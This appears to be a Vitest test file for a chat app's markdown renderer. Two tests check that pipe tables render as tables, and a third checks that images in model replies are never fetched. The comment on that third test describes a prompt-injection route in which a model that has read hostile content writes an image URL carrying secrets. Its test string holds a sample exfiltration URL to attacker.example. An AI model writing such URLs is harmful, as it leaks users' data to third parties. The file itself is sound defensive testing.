import { render, screen } from "@testing-library/react";
import Markdown from "react-markdown";
import { describe, expect, it } from "vitest";
import { MD, REMARK } from "../src/components/chat/markdown";

/**
 * The dialect the agents actually write. A comparison comes back as a pipe
 * table every time, and without the plugin it arrived as a wall of pipes and
 * dashes: this is what keeps the plugin passed at the call sites.
 */
describe("MD", () => {
  it("draws a table rather than the pipes it was written with", () => {
    render(
      <Markdown components={MD} remarkPlugins={REMARK}>
        {"| repo | pr |\n| --- | --- |\n| verksted | 131 |"}
      </Markdown>,
    );
    expect(screen.getByRole("table")).toBeTruthy();
    expect(screen.getByRole("columnheader", { name: "repo" })).toBeTruthy();
    expect(screen.getByRole("cell", { name: "131" })).toBeTruthy();
  });

  it("leaves the pipes alone when the plugin is not passed", () => {
    const { container } = render(
      <Markdown components={MD}>{"| repo | pr |\n| --- | --- |\n| verksted | 131 |"}</Markdown>,
    );
    expect(container.querySelector("table")).toBeNull();
  });

  /**
   * The one thing a reply must not be able to do on its own.
   *
   * A model that has just read a mail, a document or a PR body can be talked
   * into writing an image whose URL carries what it read. Drawn, that is a
   * request to a stranger's server the moment the bubble renders — no tap, no
   * warning, and WireGuard does not stop the browser reaching out.
   */
  it("never fetches an image a reply asked for", () => {
    const { container } = render(
      <Markdown components={MD} remarkPlugins={REMARK}>
        {"![receipt](https://attacker.example/?d=secret)\n\n![](/api/assistant/uploads/a.png)"}
      </Markdown>,
    );
    expect(container.querySelectorAll("img")).toHaveLength(0);
    // Not silently: the alt text is what the reader sees instead.
    expect(screen.getByText("receipt")).toBeTruthy();
  });
});
